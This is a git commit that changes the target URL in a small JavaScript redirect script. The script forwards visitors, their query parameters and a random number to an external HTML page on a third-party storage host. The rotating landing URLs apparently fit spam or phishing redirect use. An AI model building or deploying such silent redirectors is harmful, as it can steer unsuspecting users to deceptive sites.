b661af668164559c5a6e7750492ab785025a8099
reyalpilareyalpila <167016503+reyalpilareyalpila@users.noreply.github.com>
2024-08-18 12:43:31 +0800

    Update t.js

--- t.js
+++ t.js
@@ -1,4 +1,4 @@
-var urll="http://static.youguowei.cn/20240818/2df0f3a3275c4c36aa9ffd95a58a5376.html"
+var urll="https://oss.syounggroup.com/newretail/24081812438115921421592371.html"
 var params = new URLSearchParams(location.href.split('?')[1]);
   var sjs = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
   window.location.replace(urll + "?" + sjs + "?" + params);
